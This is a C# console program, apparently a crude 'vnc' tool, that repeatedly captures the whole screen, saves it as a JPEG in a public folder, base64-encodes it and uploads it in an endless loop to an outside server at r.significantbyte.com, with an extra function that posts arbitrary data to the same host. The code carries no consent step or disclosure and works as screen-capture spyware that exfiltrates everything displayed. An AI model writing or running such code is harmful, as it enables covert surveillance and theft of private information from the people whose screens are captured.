using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing.Imaging;
using System.Drawing;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Web;
using System.Windows;
using System.Windows.Interop;
using System.Management;

namespace vnc
{
    class Program
    {
        public static void convert(string Path)
        {
            using (Image image = Image.FromFile(Path))
            {
                using (MemoryStream m = new MemoryStream())
                {
                    image.Save(m, image.RawFormat);
                    byte[] imageBytes = m.ToArray();

                    // Convert byte[] to Base64 String

                    File.WriteAllText(@"C:\Users\Public\Publicdata.txt", Convert.ToBase64String(imageBytes)); ;
                    
                }
            }
        }
        static void Main(string[] args)
        {
            int height = 10;
            int width = 10;
            ManagementObjectSearcher mydisplayResolution = new ManagementObjectSearcher("SELECT CurrentHorizontalResolution, CurrentVerticalResolution FROM Win32_VideoController");
            foreach (ManagementObject record in mydisplayResolution.Get())
            {
                Console.WriteLine("-----------------------Current Resolution---------------------------------");
                Console.WriteLine("CurrentHorizontalResolution  -  " + record["CurrentHorizontalResolution"]);
                Console.WriteLine("CurrentVerticalResolution  -  " + record["CurrentVerticalResolution"]);
                height = Convert.ToInt32(record["CurrentVerticalResolution"].ToString().Trim());
                width = Convert.ToInt32(record["CurrentHorizontalResolution"].ToString().Trim());

            }
            Console.WriteLine(height);
            Console.WriteLine(width);
            while (true)
            {
                Point pt = new Point(width);
                Point ph = new Point(height);
                Size s = new Size(width, height);
                Rectangle bounds = Screen.GetBounds(pt);
              
                using (Bitmap bitmap = new Bitmap(Convert.ToInt32(width), Convert.ToInt32(height)))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, s);
                    }
                    bitmap.Save("C:\\Users\\Public\\test.jpg", ImageFormat.Jpeg);
                }
                convert("C:\\Users\\Public\\test.jpg");
                send2();

            }
        }
        public static void send2()
        {
            try
            {
                string path = "C:\\Users\\Public\\Publicdata.txt";
                String uriString = "https://r.significantbyte.com/vnc/tfile.php";
                WebClient myWebClient = new WebClient();
                myWebClient.Headers.Add("Content-Type", "binary/octet-stream");
                string fileName = path;
                byte[] responseArray = myWebClient.UploadFile(uriString, "POST", fileName);

                // Decode and display the response.
                Console.WriteLine("\nResponse Received. The contents of the file uploaded are:\n{0}",
                    System.Text.Encoding.ASCII.GetString(responseArray));
                File.Delete(path);
            }
            catch (WebException e)
            {
                Console.WriteLine(e.ToString());

                Console.WriteLine("Please Check Your Internet Connection");
            }
        }
        public static void send(string data)
        {
            try
            {
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create("https://r.significantbyte.com/vnc/upload.php");

                req.Method = "POST";
                string Data = "data=" + HttpUtility.UrlEncode(data);
                byte[] postBytes = Encoding.ASCII.GetBytes(Data);
                req.ContentType = "application/x-www-form-urlencoded";
                req.ContentLength = postBytes.Length;
                Stream requestStream = req.GetRequestStream();
                requestStream.Write(postBytes, 0, postBytes.Length);
                requestStream.Close();

                HttpWebResponse response = (HttpWebResponse)req.GetResponse();
                Stream resStream = response.GetResponseStream();

                var sr = new StreamReader(response.GetResponseStream());
                string responseText = sr.ReadToEnd();
                Console.WriteLine(responseText);

            }
            catch (WebException)
            {

                Console.WriteLine("Please Check Your Internet Connection");
            }
        }
    }
}
